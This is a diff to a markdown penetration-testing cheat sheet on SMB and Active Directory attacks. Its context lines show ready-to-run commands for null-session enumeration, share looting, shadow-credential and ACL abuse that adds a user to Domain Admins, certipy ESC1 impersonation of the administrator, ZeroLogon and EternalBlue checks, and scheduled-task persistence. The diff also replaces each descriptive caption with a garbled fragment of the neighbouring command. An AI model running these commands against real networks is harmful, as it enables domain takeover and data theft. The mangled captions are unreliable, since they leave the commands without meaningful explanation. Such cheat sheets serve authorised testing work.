@@ -3,7 +3,7 @@ id: "gxiw5tt11mpmy518l"
 title: "smb"
 description: ""
 tags: []
-order: 3
+order: "3"
 createdAt: "2026-05-26T18:06:06.213Z"
 updatedAt: "2026-05-26T19:10:53.893Z"
 ---
@@ -90,7 +90,7 @@ _Tags: #smb, #anonymous, #smbclient Connect to IPC$ share for RPC enumeration._
 enum4linux-ng -A $TARGET -o null_session_out
 ```
 
-_Tags: #rpcclient, #nullsession, #ipc Enumerate all available information via null session with enum4linux-ng._
+_session_
 
 **Tags:** nullsession, enum4linux, enumeration
 <!-- cmd: {"id":"mn3alle3ampmy5ihw","language":"bash","sectionId":"dfdxo7t8wmpmy5ie2","tags":["nullsession","enum4linux","enumeration"]} -->
@@ -391,7 +391,7 @@ _Share Looting & Spidering Recursively search for sensitive files in shares._
 nxc smb $TARGET -u $USER -p $PASS -M spider_plus -o READ_ONLY=False
 ```
 
-_Tags: #shares, #loot, #smbmap Spider shares and output to JSON for offline analysis._
+_plus -o READ_
 
 **Tags:** spider, loot, nxc
 <!-- cmd: {"id":"9nernb5gvmpmy5ilp","language":"bash","sectionId":"bda00a69smpmy5ien","tags":["spider","loot","nxc"]} -->
@@ -566,7 +566,7 @@ gettgtpkinit.py -cert-pfx <cert.pfx> -pfx-pass <password> $DOMAIN/$TARGET_USER t
 KRB5CCNAME=target_user.ccache nxc smb $TARGET -u $TARGET_USER --use-kcache
 ```
 
-_Tags: #shadow-credentials, #acl-abuse, #pywhisker, #ad-abuse, #privilege-escalation Authenticate as the target user using the shadow certificate and request a TGT._
+_USER target_
 
 **Tags:** shadow-credentials, pkinit, privilege-escalation, ad-abuse
 <!-- cmd: {"id":"p1rcs3gm0mpmy5ino","language":"bash","sectionId":"ya6skfq1kmpmy5if0","tags":["shadow-credentials","pkinit","privilege-escalation","ad-abuse"]} -->
@@ -593,7 +593,7 @@ bloodyAD -u $USER -p $PASS -d $DOMAIN --host $DC add groupMember "Domain Admins"
 nxc ldap $DC -u $USER -p $PASS -M add_user_to_group -o GROUP="Domain Admins" USER="$USER"
 ```
 
-_Tags: #acl, #dacl, #bloodyad, #nxc, #ad-abuse, #enumeration Add user to Domain Admins via GenericAll / WriteMember ACL._
+_user_
 
 **Tags:** acl-abuse, generic-all, privilege-escalation, bloodyad, ad-abuse
 <!-- cmd: {"id":"kf2qioxaempmy5inz","language":"bash","sectionId":"uvmz16k2xmpmy5if3","tags":["acl-abuse","generic-all","privilege-escalation","bloodyad","ad-abuse"]} -->
@@ -648,7 +648,7 @@ _AD CS — Certificate Services Abuse (SMB Context) Find vulnerable certificate 
 certipy req -u $USER@$DOMAIN -p $PASS -dc-ip $DC -target $CA_SERVER -template VulnTemplate -upn administrator@$DOMAIN -ca "$CA_NAME"
 ```
 
-_Tags: #adcs, #certipy, #certificate-templates, #ad-abuse, #privilege-escalation ESC1 — Exploit vulnerable certificate template for authentication as any user._
+_SERVER -template VulnTemplate -upn administrator@$DOMAIN -ca "$CA_
 
 **Tags:** adcs, esc1, certipy, privilege-escalation
 <!-- cmd: {"id":"i9hnl6y2vmpmy5ios","language":"bash","sectionId":"dd05j3k5xmpmy5if5","tags":["adcs","esc1","certipy","privilege-escalation"]} -->
@@ -701,7 +701,7 @@ _Tags: #vulns, #nmap, #smb Check if SMB Signing is disabled (Crucial for Relay a
 msfconsole -q -x "use auxiliary/scanner/smb/smb_ms17_010; set RHOSTS $TARGET; run"
 ```
 
-_Tags: #signing, #relay, #nxc Verify MS17-010 (EternalBlue) vulnerability._
+_ms17_
 
 **Tags:** eternalblue, ms17-010, metasploit
 <!-- cmd: {"id":"2orvuqkhhmpmy5ipf","language":"bash","sectionId":"x69zzuidempmy5if9","tags":["eternalblue","ms17-010","metasploit"]} -->
@@ -723,7 +723,7 @@ python3 zerologon_tester.py $NETBIOS_NAME $DC
 nxc smb $DC -u '' -p '' -M zerologon
 ```
 
-_Tags: #printnightmare, #cve-2021-34527, #rce, #vuln Check for ZeroLogon (CVE-2020-1472) — domain admin via Netlogon authentication bypass._
+_tester.py $NETBIOS_
 
 **Tags:** zerologon, cve-2020-1472, critical, vuln
 <!-- cmd: {"id":"22q5elnovmpmy5ipl","language":"bash","sectionId":"x69zzuidempmy5if9","tags":["zerologon","cve-2020-1472","critical","vuln"]} -->
@@ -1143,7 +1143,7 @@ _Tags: #persistence, #services, #impacket Start the created malicious service._
 nxc smb $TARGET -u $USER -p $PASS -M schtask_as -o USER=$TARGET_USER CMD="C:\Windows\System32\calc.exe"
 ```
 
-_Tags: #persistence, #services, #impacket Create a scheduled task via AT protocol for persistence._
+_as -o USER=$TARGET_
 
 **Tags:** persistence, schtask, nxc
 <!-- cmd: {"id":"gsrj3b0gbmpmy5iuz","language":"bash","sectionId":"6ur0f0qx7mpmy5ifv","tags":["persistence","schtask","nxc"]} -->
@@ -1393,7 +1393,7 @@ tshark -r smb_capture.pcap -Y 'smb2'
 tshark -r smb_capture.pcap -Y 'ntlmssp' -T fields -e ntlmssp.msv_av_dns_computer_name
 ```
 
-_SMB Traffic Capture Wireshark display filters for SMB traffic analysis._
+_capture.pcap -Y 'ntlmssp' -T fields -e ntlmssp.msv_
 
 **Tags:** wireshark, capture, traffic-analysis, pcap
 <!-- cmd: {"id":"riyy64ie8mpmy5ixk","language":"bash","sectionId":"l4rs4ji8umpmy5iga","tags":["wireshark","capture","traffic-analysis","pcap"]} -->
